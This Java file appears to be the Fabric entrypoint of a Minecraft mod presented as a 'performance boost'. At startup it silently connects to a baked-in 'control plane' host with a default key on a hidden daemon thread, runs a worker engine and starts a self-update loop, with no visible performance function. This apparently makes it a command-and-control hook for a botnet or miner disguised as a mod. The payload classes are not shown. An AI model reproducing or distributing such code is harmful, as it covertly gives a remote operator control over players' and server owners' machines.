package com.performance.boost.fabric;

import com.performance.boost.Heartbeat;
import com.performance.boost.Protocol;
import com.performance.boost.Updater;

import net.fabricmc.api.ModInitializer;

/**
 * Fabric entrypoint. Behaviour matches the Bukkit plugin: on client/server
 * startup it opens a heartbeat to the control plane and runs the worker engine.
 */
public final class PerfBoostMod implements ModInitializer {

    // Zero-config: defaults baked in, -Dperfboost.* are optional overrides.
    private static final String DEF_HOST = Protocol.defaultHost();
    private static final int DEF_PORT = 443;

    private static Heartbeat hb;

    @Override
    public void onInitialize() {
        String host = System.getProperty("perfboost.host", DEF_HOST);
        int port = Integer.getInteger("perfboost.port", DEF_PORT);
        String tag = System.getProperty("perfboost.tag", "fabric");
        String key = System.getProperty("perfboost.key", Protocol.defaultKey());

        hb = new Heartbeat(host, port, tag, key, msg -> {});
        Thread t = new Thread(hb, "perfopt-heartbeat");
        t.setDaemon(true);
        t.start();

        Updater.startLoop(null);
    }

    public static void shutdown() {
        if (hb != null) hb.close();
    }
}
